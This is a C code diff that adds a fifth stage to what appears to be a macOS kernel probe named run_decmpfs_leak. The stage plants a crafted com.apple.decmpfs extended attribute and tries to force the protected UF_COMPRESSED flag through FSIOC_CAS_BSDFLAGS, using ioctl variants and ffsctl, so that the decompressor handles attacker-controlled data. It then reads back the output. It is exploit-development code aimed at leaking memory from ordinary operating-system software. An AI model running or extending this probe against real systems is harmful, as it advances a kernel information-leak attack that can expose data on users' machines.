@@ -27,6 +27,7 @@
 #include <unistd.h>
 #include <sys/xattr.h>
 #include <sys/stat.h>
+#include <sys/ioctl.h>
 
 void log_from_c(const char* msg);
 
@@ -269,6 +270,66 @@ void run_decmpfs_leak(const char *base_dir) {
         bfree(&r); bfree(&a); bfree(&fork); bfree(&z); free(raw);
     }
 
-    unlink(path);
-    printf("=== decmpfs probe done ===\n");
-}
+    // ---- stage 5: the real gate -- FSIOC_CAS_BSDFLAGS -----------------------------
+        // chflags(UF_COMPRESSED) is silently ignored: UF_COMPRESSED is a protected
+        // flag and can only be changed with the compare-and-swap fsctl. That is why
+        // stages 1-4 never reached the decompressor. Try the safe mechanism now,
+        // once with a valid attribute present and once without (control).
+        printf("[stage 5] FSIOC_CAS_BSDFLAGS (protected UF_COMPRESSED gate)\n");
+        {
+            struct { uint32_t expected_flags, new_flags, actual_flags; } cas;
+                        extern int ffsctl(int fd, unsigned long cmd, void *arg, unsigned int size);
+                        // _IOWR('A', 20, struct fsioc_cas_bsdflags) = 0xC0000000|(12<<16)|(0x41<<8)|20
+                        const unsigned long CAS_IOCTL = 0xC00C4114ul;
+                        unsigned long variants[4] = { CAS_IOCTL, 0x800C4114ul, 0xC0004114ul, 0 };
+
+            for (int with_attr = 0; with_attr <= 1; with_attr++) {
+                unlink(path);
+                int fd = open(path, O_RDWR | O_CREAT, 0644);
+                if (fd < 0) { printf("    open failed errno=%d\n", errno); continue; }
+                if (with_attr) {
+                    buf a = {0}; cmpf_header(&a, 1, 16); bcat(&a, "ABCDEFGHIJKLMNOP", 16);
+                    int e = set_xattr_errno(path, "com.apple.decmpfs", &a);
+                    printf("    with_attr=%d xattr_err=%d\n", with_attr, e);
+                    bfree(&a);
+                }
+                struct stat st; if (fstat(fd, &st) != 0) memset(&st, 0, sizeof st);
+                printf("    with_attr=%d before: size=%lld flags=0x%x\n",
+                       with_attr, (long long)st.st_size, (unsigned)st.st_flags);
+                int done = 0;
+                for (int v = 0; v < 3 && !done; v++) {
+                    cas.expected_flags = (uint32_t)st.st_flags;
+                    cas.new_flags = (uint32_t)st.st_flags | 0x20u;  // UF_COMPRESSED
+                    cas.actual_flags = 0xdeadbeef;
+                    errno = 0;
+                    int r = ioctl(fd, variants[v], &cas);
+                    int e = errno;
+                    printf("    with_attr=%d ioctl(0x%lx) -> %d errno=%d actual=0x%x\n",
+                           with_attr, variants[v], r, e, cas.actual_flags);
+                    if (r == 0) done = 1;
+                }
+                // The proper entry point is ffsctl(), which reaches the kernel's
+                // FSIOC_CAS_BSDFLAGS handler; raw ioctl() may not be routed there.
+                if (!done) {
+                    cas.expected_flags = (uint32_t)st.st_flags;
+                    cas.new_flags = (uint32_t)st.st_flags | 0x20u;
+                    cas.actual_flags = 0xdeadbeef;
+                    errno = 0;
+                    int r = ffsctl(fd, CAS_IOCTL, &cas, (unsigned int)sizeof cas);
+                    printf("    with_attr=%d ffsctl(0x%lx) -> %d errno=%d (%s) actual=0x%x\n",
+                           with_attr, CAS_IOCTL, r, errno, strerror(errno), cas.actual_flags);
+                }
+                if (fstat(fd, &st) == 0)
+                    printf("    with_attr=%d after: size=%lld flags=0x%x\n",
+                           with_attr, (long long)st.st_size, (unsigned)st.st_flags);
+                buf rbuf = {0}; size_t rn = read_all(path, &rbuf);
+                printf("    with_attr=%d read=%zu\n", with_attr, rn);
+                if (rn) report_read(with_attr ? "cas1" : "cas0", rbuf.d, rbuf.n, 16);
+                bfree(&rbuf);
+                close(fd);
+            }
+        }
+
+        unlink(path);
+        printf("=== decmpfs probe done ===\n");
+    }
